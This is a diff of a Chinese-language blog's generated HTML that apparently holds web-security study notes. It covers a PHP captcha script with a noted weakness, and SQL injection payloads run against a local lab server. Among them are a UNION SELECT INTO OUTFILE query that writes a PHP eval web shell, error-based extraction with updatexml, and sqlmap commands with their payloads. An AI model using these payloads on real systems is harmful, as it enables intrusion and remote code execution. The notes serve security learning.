-<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span>(<span class="va">$i</span><span class="op">=</span><span class="dv">0</span><span class="ot">;</span><span class="va">$i</span><span class="op">&lt;</span><span class="dv">50</span><span class="ot">;</span><span class="va">$i</span><span class="op">++</span>) &#123;</span>
-<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>        <span class="fu">imagesetpixel</span>(<span class="va">$image</span><span class="ot">,</span> <span class="fu">rand</span>(<span class="dv">0</span><span class="ot">,</span><span class="va">$width</span>)<span class="ot">,</span> <span class="fu">rand</span>(<span class="dv">0</span><span class="ot">,</span><span class="va">$height</span>)<span class="ot">,</span> <span class="va">$color</span>)<span class="ot">;</span></span>
-<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>    <span class="fu">imagepng</span>(<span class="va">$image</span>)<span class="ot">;</span></span>
-<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>    <span class="fu">imagedestroy</span>(<span class="va">$image</span>)<span class="ot">;</span></span>
-<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">getCode</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: image/png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>
+    <span class="token variable">$vcode</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$vcode</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token function">imagecreate</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$imgColor</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">imagestring</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token variable">$vcode</span><span class="token punctuation">,</span><span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>​</p>
-<pre class="php+html"><code>// login.html
-        &lt;div style=&quot;text-align:center;vertical-align:middel;&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;vcode&quot; id=&quot;vcode&quot;
-                placeholder=&quot;验证码&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;img src=&quot;vcode.php&quot;&gt;
-        &lt;/div&gt;</code></pre>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&#x2F;&#x2F; login.html
+        &lt;div style&#x3D;&quot;text-align:center;vertical-align:middel;&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;vcode&quot; id&#x3D;&quot;vcode&quot;
+                placeholder&#x3D;&quot;验证码&quot;&gt;&nbsp;&nbsp;&lt;img src&#x3D;&quot;vcode.php&quot;&gt;
+        &lt;&#x2F;div&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>验证码存在的漏洞，页面不刷新，则验证码不变</li>
 </ul>
@@ -885,8 +880,7 @@ alt="image-20220817171831132" />
 alt="image-20220817222635768" />
 <figcaption aria-hidden="true">image-20220817222635768</figcaption>
 </figure>
-<div class="sourceCode" id="cb7"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">and</span> <span class="dv">1</span><span class="op">=</span><span class="dv">2</span> <span class="kw">union</span> <span class="kw">select</span> <span class="dv">1</span>,<span class="dv">2</span>,<span class="dv">3</span>,<span class="ot">&quot;&lt;?php eval($_POST[&#39;a&#39;]);?&gt;&quot;</span>,<span class="dv">5</span>,<span class="dv">6</span> <span class="kw">into</span> outfile <span class="ot">&quot;/opt/lampp/htdocs/security/temp/mm.php&quot;</span></span></code></pre></div>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST['a']);?>"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/opt/lampp/htdocs/security/temp/mm.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2022/08/17/4pgKba2EBVYy5sW.png"
 alt="image-20220817230147427" />
@@ -921,15 +915,13 @@ alt="image.png" />
 alt="image.png" />
 <figcaption aria-hidden="true">image.png</figcaption>
 </figure>
-<div class="sourceCode" id="cb8"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">and</span> <span class="fu">updatexml</span>(<span class="dv">1</span>,<span class="fu">concat</span>(<span class="bn">0x7e</span>,(<span class="kw">select</span> table_name <span class="kw">from</span> information_schema.<span class="kw">tables</span> <span class="kw">where</span> table_schema<span class="op">=</span><span class="st">&#39;learn&#39;</span> <span class="kw">limit</span> <span class="dv">0</span>,<span class="dv">1</span>),<span class="bn">0x7e</span>),<span class="dv">1</span>)</span></code></pre></div>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'learn'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2022/08/18/6eflZSQYPyxTswF.png"
 alt="image.png" />
 <figcaption aria-hidden="true">image.png</figcaption>
 </figure>
-<div class="sourceCode" id="cb9"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>extravalue()</span></code></pre></div>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">extravalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="盲注">盲注</h3>
 <ol type="1">
 <li>boolean型</li>
@@ -950,13 +942,11 @@ class="sourceCode sql"><code class="sourceCode sql"><span id="cb9-1"><a href="#c
 </ul>
 </blockquote>
 <h3 id="sqlmap">sqlmap</h3>
-<pre><code>sqlmap -u http://192.168.104.130/security/php/read.php?id=2</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;192.168.104.130&#x2F;security&#x2F;php&#x2F;read.php?id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://s2.loli.net/2022/08/18/SU6IEye1iOTg4YJ.png" /></p>
-<div class="sourceCode" id="cb11"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">id</span><span class="op">=</span><span class="dv">2</span> <span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="dv">3844</span> <span class="kw">FROM</span>(<span class="kw">SELECT</span> <span class="fu">COUNT</span>(<span class="op">*</span>),<span class="fu">CONCAT</span>(<span class="bn">0x717a627671</span>,(version()),<span class="bn">0x717a6b7a71</span>,<span class="fu">FLOOR</span>(RAND(<span class="dv">0</span>)<span class="op">*</span><span class="dv">2</span>))x <span class="kw">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="kw">GROUP</span> <span class="kw">BY</span> x)a)</span></code></pre></div>
-<div class="sourceCode" id="cb12"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">id</span><span class="op">=</span><span class="dv">2</span> <span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="dv">3104</span> <span class="kw">FROM</span> (<span class="kw">SELECT</span>(SLEEP(<span class="dv">5</span>)))EbAM)</span></code></pre></div>
-<pre><code>id=-4370 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a627671,0x4e454f6441584c6150544863676e42486e6c464b416a536e6c74635174596452494f487354527969,0x717a6b7a71),NULL,NULL-- -</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">2</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3844</span> <span class="token keyword">FROM</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x717a627671</span><span class="token punctuation">,</span><span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6b7a71</span><span class="token punctuation">,</span>FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">FROM</span> INFORMATION_SCHEMA<span class="token punctuation">.</span>PLUGINS <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">2</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3104</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>EbAM<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;-4370 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a627671,0x4e454f6441584c6150544863676e42486e6c464b416a536e6c74635174596452494f487354527969,0x717a6b7a71),NULL,NULL-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2022/08/18/QzsqnSLXf2ij8KR.png"
 alt="image-20220818192647936" />
@@ -1655,7 +1645,7 @@ alt="image-20220819175337638" />
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">235.4k</span>&nbsp;字
+                class="white-color">230.3k</span>&nbsp;字
             
             
             
